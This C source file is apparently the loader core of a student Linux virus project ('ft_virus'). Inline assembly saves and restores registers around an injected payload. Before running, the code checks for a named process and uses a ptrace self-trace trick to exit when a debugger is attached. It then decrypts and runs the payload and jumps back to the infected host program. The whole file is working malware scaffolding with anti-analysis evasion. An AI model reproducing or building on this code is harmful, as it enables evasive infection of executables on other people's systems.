#include "ft_virus.h"

void FORCE_INLINE push_registers()
{
	asm volatile (
		"push rbp;"
		"push 0x0;"
		"push rbx;"
		"push rax;"
		"push rdi;"
		"push rsi;"
		"push rdx;"
		"push rcx;"
		"push r8;"
		"push r9;"
		"push r10;"
		"push r11;"
		"push r12;"
		"push r13;"
		"push r14;"
		"push r15;"
		: : :
		);

}

void FORCE_INLINE pop_registers()
{
	asm volatile (
	 	"pop r15;"
		"pop r14;"
		"pop r13;"
		"pop r12;"
		"pop r11;"
		"pop r10;"
		"pop r9;"
		"pop r8;"
		"pop rcx;"
		"pop rdx;"
		"pop rsi;"
		"pop rdi;"
		"pop rax;"
		"pop rbx;"
		"pop rbp;"
		"pop rsp;"
		"add rsp, 0x8;"
		"mov rdi, 0x0;"
		: : :
		);
}

int FORCE_INLINE can_be_launch()
{
	int pid;

	if (is_proc_actif())
		return 0;
	if ((pid = FORK()))
	{
		/* FATHER */
		WAIT4(pid, 0, 0, 0);
		return (0);
	}
	else
	{
		/* CHILD */
		if (PTRACE(PTRACE_TRACEME, 0, 0, 0) == -1)
			EXIT(0); // someone is debuging us !
		return (1);
	}
	return (1);
}

#ifndef __NO_MAIN__
int main(void)
#else
void _start(void)
#endif
{
	if (can_be_launch())
		payload();
	EXIT(0);
}

void payload_start()
{
	push_registers();
	if (can_be_launch())
	{
		decrypt();
		payload();
		EXIT(0);
	}
	pop_registers();
	asm volatile (
		"jmp payload_end" : : :
	);
}
